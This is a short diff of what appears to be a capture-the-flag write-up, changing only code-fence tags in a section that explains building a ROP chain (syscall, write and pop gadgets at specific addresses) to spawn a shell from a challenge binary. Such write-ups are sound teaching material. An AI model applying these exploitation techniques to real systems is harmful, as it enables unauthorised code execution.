@@ -30,17 +30,17 @@ jnz     short loc_400B97
 ```
 ok. a rop chain is needed to gain code execution.         
 using ROPgadget we can find a syscall gadget.        
-```nasm
+```
 0x000000000040123c : syscall
 ```
 but no "/bin/sh" in the binary.            
 this requires some write gadget.                  
 this is the one I chose.         
-```nasm
+```
 0x000000000048d102 : mov dword ptr [rax], edx ; ret
 ```
 we pick somewhere in a rw section to place our string and craft a rop chain using some more gadgets:           
-```nasm
+```
 0x000000000044bce9 : pop rdx ; pop rsi ; ret
 0x0000000000415544 : pop rax ; ret
 0x0000000000400686 : pop rdi ; ret
